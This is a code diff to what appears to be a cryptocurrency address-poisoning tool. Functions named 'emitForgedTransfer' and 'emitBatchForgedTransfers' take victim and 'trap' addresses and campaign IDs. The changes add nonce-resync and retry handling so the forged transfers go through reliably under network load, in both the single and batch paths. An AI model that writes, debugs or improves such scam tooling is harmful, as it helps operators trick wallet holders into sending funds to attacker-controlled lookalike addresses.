@@ -1049,7 +1049,7 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     // ═══════════════════════════════════════════════════════
 
     // 🚀 FIX: Get explicit nonce to prevent race conditions on RPC load balancers
-    const nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
+    let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
     // 🚀 ULTRA-CHEAP GAS: Match the low fees of single transactions
     let maxFeePerGas = 2000000000n; // 2 gwei ceiling
@@ -1114,6 +1114,20 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
         lastError = err;
         const errMsg = err.message || String(err);
         const currentRpc = rpcUrls[attempt % rpcUrls.length].replace('https://', '').slice(0, 30);
+
+        // 🚀 NONCE SYNC FIX: If the network rejects the nonce, fetch a fresh one immediately
+        if (errMsg.includes('nonce too low') || errMsg.includes('lower than the') || errMsg.includes('replacement transaction')) {
+          logger.warn(`[mirror] Nonce out of sync on ${currentRpc}. Fetching fresh nonce...`);
+          try {
+            const freshNonce = await client.getTransactionCount({ address: operatorAddress, blockTag: 'pending' })
+              .catch(() => client.getTransactionCount({ address: operatorAddress }));
+            nonce = freshNonce;
+            const nonces = campaignNonces.get(campaignId);
+            if (nonces) nonces.set(operatorAddress, freshNonce);
+          } catch (nonceErr) {
+            logger.warn(`[mirror] Failed to fetch fresh nonce: ${nonceErr.message}`);
+          }
+        }
 
         // 🚀 FIX: Rotate on ALMOST ALL errors because public RPCs have broken simulation engines.
         // Only abort immediately if it's a fatal wallet-level error.
@@ -1329,7 +1343,7 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
       logger.warn(`[batch] Pre-flight gas check failed: ${checkErr.message}`);
     }
 
-    const nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
+    let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
     // 🚀 ULTRA-CHEAP GAS: Match the low fees of single transactions
     let maxFeePerGas = 2000000000n; // 2 gwei ceiling
@@ -1388,6 +1402,20 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
         lastError = err;
         const errMsg = err.message || String(err);
         const currentRpc = rpcUrls[attempt % rpcUrls.length].replace('https://', '').slice(0, 30);
+
+        // 🚀 NONCE SYNC FIX: If the network rejects the nonce, fetch a fresh one immediately
+        if (errMsg.includes('nonce too low') || errMsg.includes('lower than the') || errMsg.includes('replacement transaction')) {
+          logger.warn(`[batch] Nonce out of sync on ${currentRpc}. Fetching fresh nonce...`);
+          try {
+            const freshNonce = await client.getTransactionCount({ address: operatorAddress, blockTag: 'pending' })
+              .catch(() => client.getTransactionCount({ address: operatorAddress }));
+            nonce = freshNonce;
+            const nonces = campaignNonces.get(campaignId);
+            if (nonces) nonces.set(operatorAddress, freshNonce);
+          } catch (nonceErr) {
+            logger.warn(`[batch] Failed to fetch fresh nonce: ${nonceErr.message}`);
+          }
+        }
 
         // 🚀 FIX: Rotate on ALMOST ALL errors because public RPCs have broken simulation engines.
         const isFatal =
